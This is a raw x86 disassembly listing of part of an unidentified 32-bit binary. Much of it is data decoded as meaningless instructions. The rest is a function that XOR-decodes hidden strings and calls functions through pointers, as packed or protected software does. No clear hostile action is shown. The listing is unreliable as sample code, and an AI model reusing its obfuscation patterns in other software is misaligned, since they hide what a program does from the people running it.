  425519:	xchg   DWORD PTR [eax+0x38f44a8c],esp
  42551f:	push   ebx
  425520:	dec    ecx
  425521:	pandn  xmm5,XMMWORD PTR [eax+eiz*8-0x36]
  425527:	xchg   esp,eax
  425528:	push   0xa043df6d
  42552d:	stos   DWORD PTR es:[edi],eax
  42552e:	xor    DWORD PTR [eax+eax*8-0x23],0x85c402ab
  425536:	sbb    dh,BYTE PTR ss:[ebx-0x78]
  42553a:	xchg   ecx,eax
  42553b:	sub    BYTE PTR [ebp-0x572f605f],bh
  425541:	push   ebx
  425542:	arpl   WORD PTR [ebx+0x3e],bx
  425545:	shl    BYTE PTR [ebx-0x51],1
  425548:	jno    0x4254eb
  42554a:	sbb    dh,ah
  42554c:	ds inc ebp
  42554e:	add    ecx,ebx
  425550:	adc    DWORD PTR es:[ebx+0x6],edx
  425554:	cdq    
  425555:	(bad)  
  425556:	sahf   
  425557:	sub    BYTE PTR [ebx-0x1],bl
  42555a:	enter  0x2a12,0x75
  42555e:	cmp    dh,BYTE PTR [edx+0x3b13c981]
  425564:	push   ss
  425565:	push   eax
  425566:	pop    ds
  425567:	xchg   edi,eax
  425568:	int    0xaa
  42556a:	mov    eax,ds:0x97c79135
  42556f:	mov    ecx,esp
  425571:	or     BYTE PTR [esi+0x4c3b8162],bh
  425577:	dec    ecx
  425578:	add    al,0xb3
  42557a:	ret    0x87e
  42557d:	or     al,0x99
  42557f:	add    esp,DWORD PTR [esi-0x1297d7f]
  425585:	cmp    BYTE PTR [ebx-0x62],ch
  425588:	gs ret 0x63ae
  42558c:	mov    WORD PTR [edx],cs
  42558e:	daa    
  42558f:	pop    ds
  425590:	stc    
  425591:	xor    eax,0xda37115b
  425596:	push   ds
  425597:	mov    al,0x2c
  425599:	jl     0x425549
  42559b:	mov    ah,0x8a
  42559d:	push   ebx
  42559e:	push   eax
  42559f:	pop    esp
  4255a0:	pusha  
  4255a1:	mov    eax,0x68d89094
  4255a6:	adc    eax,0x37d3f0c8
  4255ab:	ss inc eax
  4255ad:	addr16 or al,dl
  4255b0:	(bad)  
  4255b1:	mov    esp,gs
  4255b3:	push   cs
  4255b4:	ret    0x2560
  4255b7:	pop    ds
  4255b8:	push   esi
  4255b9:	pop    ecx
  4255ba:	sub    BYTE PTR ds:0x6c677dba,ch
  4255c0:	cmp    DWORD PTR [edx-0x28],edx
  4255c3:	fcmovu st,st(2)
  4255c5:	adc    eax,0x91b922c0
  4255ca:	ror    BYTE PTR ds:0xee157605,0x8e
  4255d1:	inc    edi
  4255d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255d3:	pop    edi
  4255d4:	mov    ds:0x3448763d,eax
  4255d9:	inc    esp
  4255da:	push   edx
  4255db:	push   ss
  4255dc:	jno    0x42556f
  4255de:	push   ebp
  4255df:	fcomip st,st(2)
  4255e1:	dec    BYTE PTR [ebp+0x6faf586a]
  4255e7:	mov    DWORD PTR [esi],ecx
  4255e9:	inc    eax
  4255ea:	pop    ebx
  4255eb:	dec    bl
  4255ed:	call   0x4378d12b
  4255f2:	imul   eax,DWORD PTR [edi+eax*4+0x3a037b31],0x86470fe
  4255fd:	ret    
  4255fe:	add    dl,BYTE PTR [esi]
  425600:	pop    esi
  425601:	adc    ah,BYTE PTR [ecx+0x3ead8f2f]
  425607:	scas   al,BYTE PTR es:[edi]
  425608:	push   esi
  425609:	rcr    BYTE PTR [esi],1
  42560b:	inc    edi
  42560c:	jns    0x42566b
  42560e:	push   edi
  42560f:	fwait
  425610:	addr16 nop
  425612:	xchg   BYTE PTR [ebx],dl
  425614:	pop    es
  425615:	ret    0xf03c
  425618:	repz push ss
  42561a:	ror    ebx,cl
  42561c:	stos   BYTE PTR es:[edi],al
  42561d:	mov    ds:0xc76e0040,eax
  425622:	and    al,0xd4
  425624:	aas    
  425625:	jo     0x425676
  425627:	scas   eax,DWORD PTR es:[edi]
  425628:	fwait
  425629:	pop    ds
  42562a:	lock and dl,dh
  42562d:	ss pop edx
  42562f:	adc    esi,DWORD PTR [eax-0x35]
  425632:	sahf   
  425633:	jnp    0x425686
  425635:	(bad)  
  425636:	fidiv  DWORD PTR [ebx+0x65]
  425639:	in     eax,0x31
  42563b:	jno    0x425623
  42563d:	es dec ebp
  42563f:	mov    ebp,0x935d6370
  425644:	push   ecx
  425645:	mov    ebx,0xd269d237
  42564a:	test   DWORD PTR [edx-0x73],0xfa9aa36c
  425651:	dec    ebx
  425652:	loope  0x42567e
  425654:	inc    edi
  425655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425656:	xor    eax,0xadcd251b
  42565b:	mov    edi,0xdd299c2
  425660:	and    DWORD PTR [edx+eiz*1-0x15a4b39f],0xffffffa3
  425668:	mov    ch,0x53
  42566a:	pushf  
  42566b:	cmp    eax,0x64f5ff8a
  425670:	fsub   QWORD PTR [ebx-0x59555484]
  425676:	adc    ebx,DWORD PTR [esi-0x3e]
  425679:	mov    BYTE PTR [esi+0xfdaff2b],cl
  42567f:	push   esi
  425680:	pop    ds
  425681:	mov    dl,0xf0
  425683:	add    ch,dh
  425685:	push   edi
  425686:	ds popf 
  425688:	cmc    
  425689:	ja     0x425656
  42568b:	mov    ah,0xb8
  42568d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42568e:	leave  
  42568f:	icebp  
  425690:	jbe    0x42566b
  425692:	push   edx
  425693:	and    eax,edx
  425695:	(bad)  
  425697:	jne    0x42561a
  425699:	push   ecx
  42569a:	in     eax,dx
  42569b:	push   ss
  42569c:	push   esp
  42569d:	mov    ch,0xc5
  42569f:	sbb    al,0x35
  4256a1:	and    DWORD PTR [ebx],0x53
  4256a4:	mov    BYTE PTR [edx+0x57],dl
  4256a7:	dec    edx
  4256a8:	mov    ebp,0xa7450dc7
  4256ad:	addr16 sti 
  4256af:	push   es
  4256b0:	retf   0xd9b4
  4256b3:	ret    0xda68
  4256b6:	push   ecx
  4256b7:	in     al,0x5b
  4256b9:	mov    eax,ecx
  4256bb:	shl    BYTE PTR [edi],1
  4256bd:	enter  0x652b,0x64
  4256c1:	repz add ecx,DWORD PTR [esi-0x1a]
  4256c5:	mov    eax,0x7a461725
  4256ca:	loop   0x4256bc
  4256cc:	pop    ecx
  4256cd:	dec    esi
  4256ce:	js     0x42572d
  4256d0:	push   edi
  4256d1:	mov    esi,0x4432c97
  4256d6:	fmul   DWORD PTR ds:0xcc1db433
  4256dc:	sub    ebx,DWORD PTR [ebx-0x53]
  4256df:	cmp    al,bl
  4256e1:	cdq    
  4256e2:	test   DWORD PTR [edi+0x11],ebp
  4256e5:	pop    ecx
  4256e6:	mov    BYTE PTR [ebp+0x51],0xca
  4256ea:	mov    WORD PTR [ecx-0x14],ds
  4256ed:	pop    ebp
  4256ee:	push   es
  4256ef:	adc    eax,0x406650be
  4256f4:	test   al,0x9
  4256f6:	xchg   ecx,eax
  4256f7:	ja     0x4256c7
  4256f9:	mov    edx,0x93b09779
  4256fe:	add    al,0xea
  425700:	ret    
  425701:	jecxz  0x42577d
  425703:	retf   0x29df
  425706:	sbb    esp,DWORD PTR [edi-0x3167bf4]
  42570c:	inc    edx
  42570d:	outs   dx,DWORD PTR ds:[esi]
  42570e:	(bad)  
  42570f:	push   ebp
  425710:	lods   al,BYTE PTR ds:[esi]
  425711:	(bad)  
  425712:	iret   
  425713:	stos   BYTE PTR es:[edi],al
  425714:	ret    0x8c51
  425717:	adc    DWORD PTR [ebp+0x29],ebp
  42571a:	pop    edi
  42571b:	xchg   bl,ch
  42571d:	(bad)  
  42571e:	lock (bad) 
  425720:	es dec esp
  425722:	cli    
  425723:	add    BYTE PTR [edi+0x5305d5ce],cl
  425729:	lock shl DWORD PTR [ebx+edi*4+0x2b1a383c],0xdf
  425732:	cmp    eax,0xd49ca5a4
  425737:	jge    0x425707
  425739:	add    DWORD PTR [edi+0x7d],eax
  42573c:	sbb    dl,BYTE PTR [edx]
  42573e:	fild   DWORD PTR [eax+0xd0c7ee5]
  425744:	aas    
  425745:	iret   
  425746:	add    dh,dh
  425748:	into   
  425749:	add    al,0x62
  42574b:	hlt    
  42574c:	push   cs
  42574d:	sub    ah,BYTE PTR [esi+edi*4+0x7a]
  425751:	out    0xd4,eax
  425753:	xchg   bh,cl
  425755:	jge    0x42571a
  425757:	retf   
  425758:	call   0x19443dfa
  42575d:	pop    eax
  42575e:	add    edx,edi
  425760:	push   cs
  425761:	std    
  425762:	mov    ecx,DWORD PTR [ebp-0xc]
  425765:	pop    ebp
  425766:	inc    eax
  425767:	leave  
  425768:	jp     0x42571d
  42576a:	cmp    BYTE PTR [eax+eax*1+0x59],ch
  42576e:	popf   
  42576f:	popf   
  425770:	(bad)  
  425772:	cmp    eax,0x9449ed19
  425777:	repnz test DWORD PTR [ebp-0x70266218],edi
  42577e:	dec    esi
  42577f:	cmp    BYTE PTR [esi+eiz*4],al
  425782:	pop    esp
  425783:	xchg   edx,eax
  425784:	sbb    ch,BYTE PTR [edx-0x2d]
  425787:	(bad)  
  425788:	mov    ds:0x1f6a285b,al
  42578d:	lahf   
  42578e:	sar    DWORD PTR [ecx],1
  425790:	or     eax,DWORD PTR [edi]
  425792:	call   FWORD PTR [esi+ecx*2-0x5d1bd0cf]
  425799:	popf   
  42579a:	and    DWORD PTR [ecx],eax
  42579c:	cdq    
  42579d:	dec    edx
  42579e:	dec    edx
  42579f:	push   0x50
  4257a1:	inc    cx
  4257a3:	push   cs
  4257a4:	push   eax
  4257a5:	jmp    0x4257e9
  4257a7:	push   esp
  4257a8:	push   eax
  4257a9:	and    cl,BYTE PTR [edx+0x23]
  4257ac:	sub    al,0xb0
  4257ae:	mov    al,0x11
  4257b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257b1:	or     BYTE PTR [edx+0x3c2ababe],0x26
  4257b8:	sub    ah,bh
  4257ba:	sti    
  4257bb:	xchg   esp,eax
  4257bc:	sbb    BYTE PTR [edx],ch
  4257be:	mov    ds:0xf9a29407,eax
  4257c3:	xor    al,0xaa
  4257c6:	mov    esi,0xd0d811ac
  4257cb:	(bad)  
  4257cc:	sub    bl,BYTE PTR [esi-0x11]
  4257cf:	push   ebp
  4257d0:	xchg   esp,eax
  4257d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257d2:	push   ebp
  4257d3:	adc    DWORD PTR [ebx],0xd
  4257d6:	jp     0x42580f
  4257d8:	enter  0x9b0d,0xe
  4257dc:	popa   
  4257dd:	in     eax,dx
  4257de:	mov    ebp,0x4bedbb35
  4257e3:	pop    eax
  4257e4:	mov    dh,0xcd
  4257e6:	xor    DWORD PTR [esi-0x70],esp
  4257e9:	(bad)  
  4257ea:	repz adc cl,BYTE PTR [edx+0x2ed51298]
  4257f1:	pop    edi
  4257f2:	pusha  
  4257f3:	inc    ecx
  4257f4:	arpl   WORD PTR [esi-0x14],di
  4257f7:	cli    
  4257f8:	inc    ebp
  4257f9:	pop    es
  4257fa:	or     bl,cl
  4257fc:	sub    DWORD PTR [edx+0x1e8a8f49],ecx
  425802:	add    eax,esp
  425804:	pusha  
  425805:	iret   
  425806:	sbb    eax,0x55ec0741
  42580b:	jno    0x4257f0
  42580d:	xor    eax,DWORD PTR [edi+0xb960427]
  425813:	hlt    
  425814:	ins    DWORD PTR es:[edi],dx
  425815:	rcl    DWORD PTR [ebp+0x10],1
  425818:	cwde   
  425819:	(bad)  
  42581a:	and    dl,cl
  42581c:	hlt    
  42581d:	jb     0x425806
  42581f:	xchg   ecx,eax
  425820:	xchg   esp,eax
  425821:	jle    0x425837
  425823:	std    
  425824:	rol    esi,cl
  425826:	xlat   BYTE PTR ds:[ebx]
  425827:	ins    BYTE PTR es:[edi],dx
  425828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425829:	cmp    bl,BYTE PTR [esi]
  42582b:	push   eax
  42582c:	cmp    ch,bl
  42582e:	cli    
  42582f:	cmp    ah,BYTE PTR [ecx]
  425831:	aad    0xd9
  425833:	cdq    
  425834:	iret   
  425835:	push   ecx
  425836:	jp     0x425823
  425838:	mov    eax,0xe66adc17
  42583d:	mov    ecx,0xf0df7d07
  425842:	mov    ds:0xf7a0725d,eax
  425847:	jb     0x425895
  425849:	(bad)  
  42584b:	pop    eax
  42584c:	cdq    
  42584d:	fxch   st(3)
  42584f:	es in  eax,0xb7
  425852:	mov    ebx,0xadf4c03
  425857:	and    esp,DWORD PTR [ebx+esi*2-0x2c09042b]
  42585e:	mov    al,0xa9
  425860:	mov    gs,WORD PTR [eax-0x5cfc110c]
  425866:	(bad)  
  425867:	cli    
  425868:	jg     0x4258a5
  42586a:	clc    
  42586b:	je     0x4258c0
  425871:	mov    DWORD PTR [ebp-0xc],esi
  425874:	mov    eax,DWORD PTR [ebp-0xc]
  425877:	mov    esi,DWORD PTR [ebp+0xc]
  42587a:	xor    eax,ecx
  42587c:	lea    eax,[eax*8+0x1939820]
  425883:	mov    eax,DWORD PTR [esi+eax*1]
  425886:	mov    DWORD PTR [ebp+0xc],eax
  425889:	mov    eax,DWORD PTR [ebp-0x4]
  42588c:	mov    esi,DWORD PTR [ebp-0x8]
  42588f:	xor    eax,ecx
  425891:	xor    esi,ecx
  425893:	add    esi,edx
  425895:	add    eax,edx
  425897:	imul   eax,esi
  42589a:	mov    esi,DWORD PTR [ebp+0xc]
  42589d:	cmp    esi,eax
  42589f:	je     0x4258c0
  4258a5:	mov    eax,DWORD PTR [ebp-0x4]
  4258a8:	xor    eax,ecx
  4258aa:	mov    ecx,DWORD PTR [ebp+0xc]
  4258ad:	add    eax,edx
  4258af:	imul   eax,ecx
  4258b2:	add    eax,DWORD PTR [ebp+0x8]
  4258b5:	mov    DWORD PTR [ebp+0xc],eax
  4258b8:	mov    eax,DWORD PTR [ebp+0xc]
  4258bb:	jmp    0x4258d1
  4258c0:	mov    eax,DWORD PTR [ebp-0x4]
  4258c3:	mov    esi,DWORD PTR [ebp-0x8]
  4258c6:	xor    esi,ecx
  4258c8:	xor    eax,ecx
  4258ca:	add    esi,edx
  4258cc:	add    eax,edx
  4258ce:	imul   eax,esi
  4258d1:	pop    edi
  4258d2:	pop    esi
  4258d3:	leave  
  4258d4:	ret    0x8
	...
  4258e3:	add    ah,cl
  4258e5:	cmp    al,0xf3
  4258e7:	dec    ebp
  4258e8:	add    BYTE PTR [eax],al
  4258ea:	add    BYTE PTR [eax],al
  4258ec:	add    al,BYTE PTR [eax]
  4258ee:	add    BYTE PTR [eax],al
  4258f0:	add    BYTE PTR ss:[eax],al
  4258f3:	add    BYTE PTR [eax],al
  4258f5:	pop    ecx
  4258f6:	add    al,BYTE PTR [eax]
  4258f8:	add    BYTE PTR [ebp+0x2],cl
  4258fb:	add    BYTE PTR [eax],al
  4258fd:	add    BYTE PTR [eax],al
  4258ff:	add    BYTE PTR [edx+0x53],dl
  425902:	inc    esp
  425903:	push   ebx
  425904:	xor    DWORD PTR [esi],ebx
  425906:	in     eax,dx
  425907:	adc    DWORD PTR [eax-0x70b4ce62],eax
  42590d:	xor    ecx,0x3b0e2c78
  425913:	cmp    DWORD PTR [ecx],eax
  425915:	add    BYTE PTR [eax],al
  425917:	add    BYTE PTR [edi+0x3a],al
  42591a:	pop    esp
  42591b:	push   ebx
  42591c:	jns    0x425991
  42591e:	and    BYTE PTR [ecx+ebp*2+0x72],al
  425922:	and    BYTE PTR [edi+0x69],dl
  425925:	outs   dx,BYTE PTR ds:[esi]
  425926:	pop    esp
  425927:	inc    esi
  425928:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x49617461
  425930:	outs   dx,BYTE PTR ds:[esi]
  425931:	jae    0x42599c
  425933:	fs add BYTE PTR gs:[ebx-0x137e13ab],cl
  42593b:	or     BYTE PTR [ecx],al
  42593d:	add    BYTE PTR [eax],al
  42593f:	push   ebx
  425940:	mov    eax,ebx
  425942:	xchg   ecx,eax
  425943:	mov    eax,DWORD PTR [ebp+0x8]
  425946:	cmp    eax,0xf89c85a5
  42594b:	jne    0x425e0c
  425951:	mov    eax,DWORD PTR [ebp+0xc]
  425954:	cmp    eax,0xf89c85a2
  425959:	jne    0x425e0c
  42595f:	mov    eax,DWORD PTR [ebp+0x24]
  425962:	mov    DWORD PTR [ebp-0x4],eax
  425965:	mov    eax,DWORD PTR [ebp-0x4]
  425968:	mov    eax,DWORD PTR [eax+0x1d8]
  42596e:	mov    eax,DWORD PTR [eax]
  425970:	mov    eax,DWORD PTR [eax]
  425972:	mov    DWORD PTR [ebp-0x8],eax
  425975:	mov    BYTE PTR [ebp-0x18],0x1a
  425979:	mov    BYTE PTR [ebp-0x17],0x1f
  42597d:	mov    BYTE PTR [ebp-0x16],0x18
  425981:	mov    BYTE PTR [ebp-0x15],0x4e
  425985:	mov    BYTE PTR [ebp-0x14],0x51
  425989:	mov    BYTE PTR [ebp-0x13],0x83
  42598d:	mov    BYTE PTR [ebp-0x20],0xc
  425991:	mov    BYTE PTR [ebp-0x1f],0xe
  425995:	mov    BYTE PTR [ebp-0x1e],0x1c
  425999:	mov    BYTE PTR [ebp-0x1d],0x11
  42599d:	mov    BYTE PTR [ebp-0x1c],0x4e
  4259a1:	mov    BYTE PTR [ebp-0x1b],0x51
  4259a5:	mov    BYTE PTR [ebp-0x1a],0x83
  4259a9:	mov    BYTE PTR [ebp-0x28],0xe
  4259ad:	mov    BYTE PTR [ebp-0x27],0x1b
  4259b1:	mov    BYTE PTR [ebp-0x26],0x17
  4259b5:	mov    BYTE PTR [ebp-0x25],0xa
  4259b9:	mov    BYTE PTR [ebp-0x24],0x20
  4259bd:	mov    BYTE PTR [ebp-0x23],0x13
  4259c1:	mov    BYTE PTR [ebp-0x22],0x18
  4259c5:	mov    BYTE PTR [ebp-0x21],0x83
  4259c9:	xor    ecx,ecx
  4259cb:	lea    eax,[ebp+ecx*1-0x18]
  4259cf:	movzx  edx,BYTE PTR [eax]
  4259d2:	xor    edx,0x7e
  4259d5:	add    edx,0x3
  4259d8:	inc    ecx
  4259d9:	mov    BYTE PTR [eax],dl
  4259db:	cmp    ecx,0x6
  4259de:	jb     0x4259cb
  4259e0:	xor    ecx,ecx
  4259e2:	lea    eax,[ebp+ecx*1-0x20]
  4259e6:	movzx  edx,BYTE PTR [eax]
  4259e9:	xor    edx,0x7e
  4259ec:	add    edx,0x3
  4259ef:	inc    ecx
  4259f0:	mov    BYTE PTR [eax],dl
  4259f2:	cmp    ecx,0x7
  4259f5:	jb     0x4259e2
  4259f7:	xor    ecx,ecx
  4259f9:	lea    eax,[ebp+ecx*1-0x28]
  4259fd:	movzx  edx,BYTE PTR [eax]
  425a00:	xor    edx,0x7e
  425a03:	add    edx,0x3
  425a06:	inc    ecx
  425a07:	mov    BYTE PTR [eax],dl
  425a09:	cmp    ecx,0x8
  425a0c:	jb     0x4259f9
  425a0e:	lea    eax,[ebp-0x2c]
  425a11:	mov    DWORD PTR [ebp-0x8],eax
  425a14:	mov    ecx,DWORD PTR [ebp-0x8]
  425a17:	mov    eax,0x7113fccf
  425a1c:	mov    DWORD PTR [ecx],eax
  425a1e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425a21:	push   esi
  425a22:	push   edi
  425a23:	mov    esi,0x4e3e
  425a28:	mov    ebx,0x3272f5
  425a2d:	cmp    ecx,eax
  425a2f:	jne    0x425afa
  425a35:	lea    eax,[esi+0x39]
  425a38:	mov    WORD PTR [ebp-0x78],ax
  425a3c:	mov    eax,esi
  425a3e:	mov    WORD PTR [ebp-0x76],ax
  425a42:	add    eax,0x3f
  425a45:	mov    WORD PTR [ebp-0x74],ax
  425a49:	lea    eax,[esi-0x2]
  425a4c:	mov    WORD PTR [ebp-0x72],ax
  425a50:	add    eax,0x43
  425a53:	mov    ecx,eax
  425a55:	lea    eax,[esi-0x9]
  425a58:	mov    WORD PTR [ebp-0x66],ax
  425a5c:	mov    eax,esi
  425a5e:	mov    WORD PTR [ebp-0x64],ax
  425a62:	add    eax,0xffffffec
  425a65:	mov    WORD PTR [ebp-0x62],ax
  425a69:	mov    eax,0x443
  425a6e:	mov    WORD PTR [ebp-0x60],ax
  425a72:	mov    eax,0x5670
  425a77:	mov    WORD PTR [ebp-0x5e],ax
  425a7b:	mov    eax,0x6110
  425a80:	mov    WORD PTR [ebp-0x5c],ax
  425a84:	lea    eax,[ebp-0xe0]
  425a8a:	push   eax
  425a8b:	mov    eax,DWORD PTR [ebp+0xc]
  425a8e:	mov    edi,0x75108ae
  425a93:	xor    eax,edi
  425a95:	add    eax,ebx
  425a97:	push   eax
  425a98:	mov    WORD PTR [ebp-0x70],cx
  425a9c:	lea    ecx,[esi-0xe]
  425a9f:	mov    edx,ecx
  425aa1:	lea    eax,[ebp-0x78]
  425aa4:	push   eax
  425aa5:	mov    eax,DWORD PTR [ebp-0x4]
  425aa8:	mov    eax,DWORD PTR [eax+0x198]
  425aae:	mov    WORD PTR [ebp-0x6e],dx
  425ab2:	mov    edx,0x4f8a
  425ab7:	mov    WORD PTR [ebp-0x6c],dx
  425abb:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e31
  425ac2:	mov    DWORD PTR [ebp-0x5a],0x4e30f1e6
  425ac9:	mov    DWORD PTR [ebp-0xe0],0x1
  425ad3:	mov    DWORD PTR [ebp-0xdc],0x255
  425add:	push   DWORD PTR [eax]
  425adf:	mov    eax,DWORD PTR [ebp+0x10]
  425ae2:	call   eax
  425ae4:	mov    DWORD PTR [ebp-0x8],eax
  425ae7:	mov    eax,DWORD PTR [ebp-0x8]
  425aea:	test   eax,eax
  425aec:	je     0x425aff
  425aee:	xor    DWORD PTR ds:0x76586876,0x87687666
  425af8:	jmp    0x425aff
  425afa:	mov    edi,0x75108ae
  425aff:	mov    eax,DWORD PTR [ebp-0x4]
  425b02:	mov    ecx,DWORD PTR [eax+0x18c]
  425b08:	xor    eax,eax
  425b0a:	cmp    DWORD PTR [ecx],eax
  425b0c:	jne    0x425d7f
  425b12:	mov    ecx,DWORD PTR [ebp-0x4]
  425b15:	mov    ecx,DWORD PTR [ecx+0x17c]
  425b1b:	mov    DWORD PTR [ecx],eax
  425b1d:	mov    ecx,DWORD PTR [ebp-0x4]
  425b20:	mov    ecx,DWORD PTR [ecx+0x180]
  425b26:	mov    DWORD PTR [ecx],eax
  425b28:	mov    eax,0x4e6d
  425b2d:	mov    WORD PTR [ebp-0x9c],ax
  425b34:	mov    eax,esi
  425b36:	mov    WORD PTR [ebp-0x9a],ax
  425b3d:	mov    eax,0x4e7d
  425b42:	mov    WORD PTR [ebp-0x98],ax
  425b49:	add    eax,0xffffffc0
  425b4c:	mov    WORD PTR [ebp-0x96],ax
  425b53:	mov    eax,0x4f8e
  425b58:	mov    WORD PTR [ebp-0x94],ax
  425b5f:	mov    eax,0x4e32
  425b64:	mov    WORD PTR [ebp-0x92],ax
  425b6b:	add    eax,0x4d
  425b6e:	mov    WORD PTR [ebp-0x90],ax
  425b75:	mov    eax,0x4e30
  425b7a:	mov    WORD PTR [ebp-0x8e],ax
  425b81:	mov    eax,esi
  425b83:	mov    WORD PTR [ebp-0x8c],ax
  425b8a:	mov    eax,0x4e31
  425b8f:	mov    WORD PTR [ebp-0x8a],ax
  425b96:	mov    eax,0x99fd
  425b9b:	mov    WORD PTR [ebp-0x88],ax
  425ba2:	mov    eax,0x8d62
  425ba7:	mov    WORD PTR [ebp-0x86],ax
  425bae:	mov    eax,0xd66f
  425bb3:	mov    WORD PTR [ebp-0x84],ax
  425bba:	mov    eax,0xd783
  425bbf:	mov    WORD PTR [ebp-0x82],ax
  425bc6:	mov    eax,0x2780
  425bcb:	mov    WORD PTR [ebp-0x80],ax
  425bcf:	mov    eax,0x4780
  425bd4:	mov    WORD PTR [ebp-0x7e],ax
  425bd8:	mov    eax,0x4e33
  425bdd:	push   0x8
  425bdf:	mov    WORD PTR [ebp-0x7c],ax
  425be3:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  425bea:	mov    DWORD PTR [ebp-0xc],0x83181320
  425bf1:	lea    eax,[ebp-0x10]
  425bf4:	pop    ecx
  425bf5:	mov    dl,BYTE PTR [eax]
  425bf7:	xor    dl,0x7e
  425bfa:	add    dl,0x3
  425bfd:	mov    BYTE PTR [eax],dl
  425bff:	inc    eax
  425c00:	dec    ecx
  425c01:	jne    0x425bf5
  425c03:	lea    eax,[ebp-0x10]
  425c06:	mov    DWORD PTR [ebp-0xdc],eax
  425c0c:	lea    eax,[ebp-0xe0]
  425c12:	push   eax
  425c13:	mov    eax,DWORD PTR [ebp+0xc]
  425c16:	xor    eax,edi
  425c18:	add    eax,ebx
  425c1a:	push   eax
  425c1b:	mov    eax,DWORD PTR [ebp-0x4]
  425c1e:	add    eax,0x66
  425c21:	push   eax
  425c22:	mov    eax,DWORD PTR [ebp-0x4]
  425c25:	mov    eax,DWORD PTR [eax+0x198]
  425c2b:	mov    DWORD PTR [ebp-0xe0],0x1
  425c35:	push   DWORD PTR [eax]
  425c37:	mov    eax,DWORD PTR [ebp+0x10]
  425c3a:	call   eax
  425c3c:	mov    ecx,DWORD PTR [ebp+0x8]
  425c3f:	xor    ecx,edi
  425c41:	add    ecx,ebx
  425c43:	mov    DWORD PTR [ebp-0x8],eax
  425c46:	cmp    eax,ecx
  425c48:	jne    0x425c63
  425c4a:	mov    eax,ds:0x33730bcc
  425c4f:	or     eax,0x22150bcf
  425c54:	mov    ds:0x33730bcc,eax
  425c59:	add    eax,0x3372e92f
  425c5e:	mov    ds:0x33730bcc,eax
  425c63:	mov    ecx,0x4e66
  425c68:	mov    eax,ecx
  425c6a:	mov    WORD PTR [ebp-0x40],ax
  425c6e:	add    eax,0x5
  425c71:	mov    edx,eax
  425c73:	mov    WORD PTR [ebp-0x3e],dx
  425c77:	mov    edx,0x4f93
  425c7c:	mov    WORD PTR [ebp-0x3c],dx
  425c80:	add    edx,0xfffffff8
  425c83:	mov    WORD PTR [ebp-0x3a],dx
  425c87:	mov    edx,0x4f89
  425c8c:	mov    WORD PTR [ebp-0x38],dx
  425c90:	add    edx,0x3
  425c93:	mov    WORD PTR [ebp-0x36],dx
  425c97:	mov    edx,0x4f87
  425c9c:	mov    WORD PTR [ebp-0x34],dx
  425ca0:	mov    WORD PTR [ebp-0x32],cx
  425ca4:	mov    ecx,esi
  425ca6:	mov    WORD PTR [ebp-0x30],cx
  425caa:	lea    ecx,[edx-0x1]
  425cad:	mov    edx,ecx
  425caf:	mov    WORD PTR [ebp-0x54],dx
  425cb3:	mov    edx,eax
  425cb5:	mov    WORD PTR [ebp-0x52],dx
  425cb9:	mov    edx,0x4e73
  425cbe:	mov    WORD PTR [ebp-0x50],dx
  425cc2:	mov    WORD PTR [ebp-0x4e],ax
  425cc6:	lea    eax,[edx-0xa]
  425cc9:	mov    WORD PTR [ebp-0x4c],ax
  425ccd:	add    eax,0x3
  425cd0:	mov    WORD PTR [ebp-0x4a],ax
  425cd4:	lea    eax,[edx-0xc]
  425cd7:	mov    WORD PTR [ebp-0x48],ax
  425cdb:	mov    WORD PTR [ebp-0x46],cx
  425cdf:	mov    WORD PTR [ebp-0x44],si
  425ce3:	mov    eax,DWORD PTR [ebp+0x8]
  425ce6:	movzx  ecx,WORD PTR [ebp-0x54]
  425cea:	xor    eax,edi
  425cec:	add    eax,ebx
  425cee:	xor    eax,ecx
  425cf0:	mov    WORD PTR [ebp-0x54],ax
  425cf4:	mov    eax,DWORD PTR [ebp+0x8]
  425cf7:	movzx  ecx,WORD PTR [ebp-0x40]
  425cfb:	xor    eax,edi
  425cfd:	add    eax,ebx
  425cff:	xor    eax,ecx
  425d01:	mov    WORD PTR [ebp-0x40],ax
  425d05:	xor    eax,eax
  425d07:	mov    WORD PTR [ebp-0xf4],ax
  425d0e:	mov    WORD PTR [ebp-0x108],ax
  425d15:	mov    edi,DWORD PTR [ebp+0x24]
  425d18:	lea    eax,[ebp-0xf4]
  425d1e:	lea    edx,[ebp-0x54]
  425d21:	mov    DWORD PTR [ebp-0xe0],0x2
  425d2b:	mov    DWORD PTR [ebp-0xdc],eax
  425d31:	call   0x428769
  425d36:	mov    DWORD PTR [ebp-0xd8],eax
  425d3c:	lea    eax,[ebp-0xe0]
  425d42:	push   eax
  425d43:	mov    eax,DWORD PTR [ebp+0xc]
  425d46:	xor    eax,0x75108ae
  425d4b:	add    eax,ebx
  425d4d:	push   eax
  425d4e:	lea    eax,[ebp-0x9c]
  425d54:	push   eax
  425d55:	push   DWORD PTR [ebp-0x8]
  425d58:	mov    eax,DWORD PTR [ebp+0x10]
  425d5b:	call   eax
  425d5d:	mov    edi,DWORD PTR [ebp+0x24]
  425d60:	lea    eax,[ebp-0x108]
  425d66:	lea    edx,[ebp-0x40]
  425d69:	mov    DWORD PTR [ebp-0xdc],eax
  425d6f:	call   0x428769
  425d74:	mov    DWORD PTR [ebp-0xd8],eax
  425d7a:	mov    edi,0x75108ae
  425d7f:	mov    eax,DWORD PTR [ebp+0x14]
  425d82:	push   DWORD PTR [ebp-0x4]
  425d85:	push   DWORD PTR [ebp+0x20]
  425d88:	push   DWORD PTR [ebp+0x1c]
  425d8b:	push   DWORD PTR [ebp+0x18]
  425d8e:	push   DWORD PTR [ebp+0x10]
  425d91:	push   DWORD PTR [ebp+0x8]
  425d94:	push   DWORD PTR [ebp+0xc]
  425d97:	call   0x42700a
  425d9c:	test   eax,eax
  425d9e:	je     0x425de2
  425da0:	add    DWORD PTR [ebp-0x4],eax
  425da3:	push   DWORD PTR [ebp-0x4]
  425da6:	lea    esi,[ebp+0x4]
  425da9:	call   0x4261fa
  425dae:	mov    eax,DWORD PTR [ebp-0x4]
  425db1:	mov    eax,DWORD PTR [eax+0x1c8]
  425db7:	mov    eax,DWORD PTR [eax]
  425db9:	xor    eax,edi
